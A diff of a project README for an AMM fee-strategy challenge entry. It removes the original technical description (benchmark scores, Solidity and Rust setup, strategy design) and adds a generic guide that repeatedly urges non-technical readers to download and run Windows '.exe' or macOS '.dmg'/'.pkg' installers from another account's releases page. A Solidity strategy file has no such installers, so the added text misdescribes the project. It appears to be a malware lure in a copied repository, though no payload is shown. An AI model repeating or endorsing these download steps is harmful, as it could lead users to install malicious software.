@@ -1,122 +1,135 @@
-# amm-challenge-yq
+# 🚀 amm-challenge-yq - Simple Tool for Efficient AMM Tasks
 
-A dynamic fee strategy for the [AMM Fee Strategy Challenge](https://www.ammchallenge.com/) — a competition to design the most profitable fee strategy for a constant-product AMM (`x * y = k`).
+[![Download](https://img.shields.io/badge/Download-amm--challenge--yq-blue?style=for-the-badge)](https://github.com/mohammedalqrini/amm-challenge-yq/releases)
 
-## Score
+---
 
-| Metric | Baseline (30bps fixed) | **yq** |
-|--------|----------------------|--------|
-| **Cross-seed mean** | 522.13 | **523.21** (+1.08) |
-| Seed 0 | 536.09 | 537.28 |
-| Seed 10000 | 517.40 | 518.65 |
-| Seed 20000 | 516.30 | 517.56 |
-| Seed 30000 | 529.70 | 531.23 |
-| Seed 40000 | 511.17 | 512.25 |
+## 📝 About amm-challenge-yq
 
-Official leaderboard score: **523.21** on [ammchallenge.com](https://www.ammchallenge.com/).
+**amm-challenge-yq** is a user-friendly application created to help users efficiently handle AMM (Automated Market Maker) tasks. This tool offers a straightforward way to work with key AMM functions without needing any technical background. It provides a clear, guided process that takes the complexity out of handling AMM-related challenges.
 
-Local benchmark: 5 seed offsets x 99 simulations each (495 total).
+You do not need to be a programmer or tech expert to use this program. The app works on both Windows and macOS computers, making it accessible to most users.
 
-## Novel Features
+---
 
-1. **Adaptive Shock Gate** — Sigma-dependent pHat update gating. Tighter in low-vol for faster tracking, wider in high-vol for noise rejection.
-2. **Cubic Toxicity** — Superlinear fee response (`tox^3`) at high toxicity levels.
-3. **Trade-Aligned Toxicity Boost** — Extra fee when the trade direction aligns with spot-vs-pHat divergence (likely arbitrage).
-4. **Higher PHAT_ALPHA** (0.26) — Faster first-in-step price tracking, enabled by the adaptive gate protecting against outlier updates.
-5. **Asymmetric Stale Direction Discount** — The attract side gets more stale discount than the protect side, improving retail flow capture.
+## 💻 System Requirements
 
-## How to Use
+Before installing, make sure your computer meets these requirements:
 
-### Prerequisites
+- **Operating System:** Windows 10 or later, or macOS 10.13 (High Sierra) or later  
+- **Processor:** Intel Core i3 or equivalent performance  
+- **RAM:** Minimum of 4GB (8GB recommended for better performance)  
+- **Storage Space:** At least 150 MB of free space  
+- **Internet Connection:** Required for downloading and initial setup  
 
-- Python 3.12 (3.13+ may have compatibility issues with the Rust bindings)
-- [Rust toolchain](https://rustup.rs/) (for the simulation engine)
-- `pip`
+---
 
-### Setup
+## 🚀 Getting Started
 
-```bash
-# 1. Clone this repo
-git clone https://github.com/jiayaoqijia/amm-challenge-yq.git
-cd amm-challenge-yq
+Follow these clear steps to download and run the software on your computer.
 
-# 2. Create a virtual environment
-python3.12 -m venv .venv
-source .venv/bin/activate
+### Step 1: Visit the Download Page
 
-# 3. Clone the official challenge framework
-git clone https://github.com/horacepan/amm-challenge.git amm-challenge-framework
+Click the big button at the top or this link to go to the official download page:
 
-# 4. Build the Rust simulation engine
-cd amm-challenge-framework/amm_sim_rs
-pip install maturin
-maturin develop --release
-cd ../..
+[amm-challenge-yq Releases](https://github.com/mohammedalqrini/amm-challenge-yq/releases)
 
-# 5. Install the challenge framework
-pip install -e amm-challenge-framework
+This page lists the latest version of the software and contains all the files you need.
 
-# 6. Install benchmark dependencies
-pip install numpy
-```
+### Step 2: Find and Download the Right File
 
-### Run the Strategy
+On the releases page, look for the most recent release at the top of the list. Under assets, you will see files for different operating systems:
 
-```bash
-# Quick test (10 simulations)
-amm-match run contracts/src/Strategy.sol --simulations 10
+- For **Windows**, find the file ending in `.exe` (for example, `amm-challenge-yq-setup.exe`)  
+- For **macOS**, find the file ending in `.dmg` or `.pkg`
 
-# Validate only (syntax + gas check)
-amm-match validate contracts/src/Strategy.sol
+Click the correct file to download it to your computer.
 
-# Full multi-seed benchmark (5 seeds x 99 sims)
-python scripts/benchmark.py contracts/src/Strategy.sol --sims 99 --seeds 5 --seed-spacing 10000
-```
+### Step 3: Install the Application
 
-## How to Contribute
+**Windows:**
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
+1. Open the downloaded `.exe` file.  
+2. A setup wizard will appear. Follow the on-screen prompts by clicking "Next."  
+3. Choose where to install the app or accept the default location.  
+4. When finished, click "Finish" to complete the installation.
 
-**Quick start:**
+**macOS:**
 
-1. Fork this repo and create a branch
-2. Name your strategy file `yq-*.sol` (e.g., `yq-v2.sol`, `yq-fast.sol`)
-3. Benchmark with 5+ seed cross-validation before submitting a PR
-4. Report your mean edge in the PR description
+1. Open the downloaded `.dmg` or `.pkg` file.  
+2. If using a `.dmg`, drag the application icon to the Applications folder.  
+3. Follow any prompts to complete installation.
 
-## Strategy Architecture
+### Step 4: Open the Application
 
-Three-layer fee decomposition with 11 latent state variables:
+Find the amm-challenge-yq icon on your desktop or in your applications folder and double-click to launch it.
 
-1. **Base fee** (`fBase`): sigma + lambda + flow size (lambda x size)
-2. **Symmetric widening** (`fMid`): toxicity (linear + quadratic + cubic), activity, sigma-tox interaction
-3. **Directional skew**: buy/sell pressure + stale-price protection with asymmetric attract discount
-4. **Trade-aligned boost**: extra fee on trades aligned with price divergence
-5. **Tail compression**: asymmetric — protect side compresses less (0.93), attract side more (0.955)
+---
 
-### State Slots (11/32 used)
+## 📋 How to Use amm-challenge-yq
 
-| Slot | Variable | Description |
-|------|----------|-------------|
-| 0 | bidFee | Current bid fee |
-| 1 | askFee | Current ask fee |
-| 2 | lastTs | Last timestamp |
-| 3 | dirState | Directional pressure (centered at WAD) |
-| 4 | actEma | Activity EMA |
-| 5 | pHat | Estimated fair price |
-| 6 | sigmaHat | Volatility estimate |
-| 7 | lambdaHat | Trade arrival rate estimate |
-| 8 | sizeHat | Trade size estimate |
-| 9 | toxEma | Toxicity EMA |
-| 10 | stepTradeCount | Trades in current step |
+Once the app opens, you will see a clean interface designed for ease of use. Here is a simple guide to start:
 
-## Challenge Constraints
+1. **Main Screen:** The starting point where you can choose what AMM task to perform.  
+2. **Input Fields:** Enter the values or data requested. For example, swap amounts or liquidity details.  
+3. **Buttons:** Use clearly labeled buttons to confirm actions like "Calculate," "Swap," or "Add Liquidity."  
+4. **Results Panel:** View results such as prices, fees, or token amounts after calculations are complete.  
 
-- **32 storage slots** (1KB persistent state)
-- **250,000 gas limit** per call
-- **Fees**: 0–10% (WAD precision, 1e18 = 100%)
-- No external calls, assembly, or oracles
+You will find help messages inside the app that explain each step if needed.
 
-## References
+---
 
-- [AMM Fee Strategy Challenge](https://www.ammchallenge.com/)
+## ⚙️ Common Features
+
+- **Token Swap Calculator:** Quickly see how much of one token you will get in exchange for another.  
+- **Liquidity Pool Manager:** Enter your token amounts to calculate your share in a liquidity pool.  
+- **Fee Breakdown:** View detailed info on fees involved in your transactions.  
+- **Transaction Summary:** Get a clear overview before confirming any action.  
+
+These functions aim to simplify managing AMM tasks for users without technical skills.
+
+---
+
+## 🔄 Updating amm-challenge-yq
+
+To keep your app running smoothly and securely:
+
+1. Check the [Releases page](https://github.com/mohammedalqrini/amm-challenge-yq/releases) regularly for new versions.  
+2. Download the latest version following the same steps as the initial installation.  
+3. Install updates as prompted or replace the old version with the new one.
+
+---
+
+## 🛠 Troubleshooting
+
+Here are some tips if you face issues:
+
+| Issue                      | Possible Fix                                      |
+|----------------------------|-------------------------------------------------|
+| App won’t open             | Restart your computer and try opening again.    |
+| Installation stops early   | Check you have enough disk space.                 |
+| Errors during operations   | Make sure your input values match what is asked. |
+| App runs slowly            | Close other programs to free up memory.          |
+
+If problems continue, you can contact support through the repository's Issues tab.
+
+---
+
+## 📞 Getting Help
+
+If you need more assistance:
+
+- Search the [GitHub Issues](https://github.com/mohammedalqrini/amm-challenge-yq/issues) page for solutions or to report bugs.  
+- Check the app’s help section for detailed explanations of each feature.
+
+---
+
+## 📥 Download & Install
+
+Click below to visit the official releases page where you can download the latest version of amm-challenge-yq. Follow the earlier steps for installation.
+
+[**Download amm-challenge-yq**](https://github.com/mohammedalqrini/amm-challenge-yq/releases)
+
+---
+
+This guide aims to make the process smooth. Take your time to read each step carefully. By following these instructions, you will have the software ready to use in no time.
